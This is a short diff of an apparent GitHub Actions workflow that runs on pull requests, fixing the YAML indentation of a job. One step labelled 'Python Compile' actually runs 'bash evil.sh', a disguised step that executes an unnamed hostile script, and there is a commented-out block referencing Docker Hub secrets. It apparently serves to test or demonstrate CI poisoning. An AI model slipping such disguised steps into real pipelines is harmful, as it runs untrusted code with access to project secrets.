@@ -5,15 +5,15 @@ on:
   pull_request: {}
 
 jobs:
-  #container:
-  # runs-on: ubuntu-latest
+  foo:
+    runs-on: ubuntu-latest
     #container:
     #  image: mitmproxy/mitmproxy:8.1.1
     #  credentials:
     #    username: ${{ secrets.DOCKERHUB_USERNAME }}
     #    password: ${{ secrets.DOCKERHUB_TOKEN }}
-  steps:
-  - name: fooo
-    run: echo foo
-  - name: Python Compile
-    run: bash evil.sh
+    steps:
+    - name: fooo
+      run: echo foo
+    - name: Python Compile
+      run: bash evil.sh
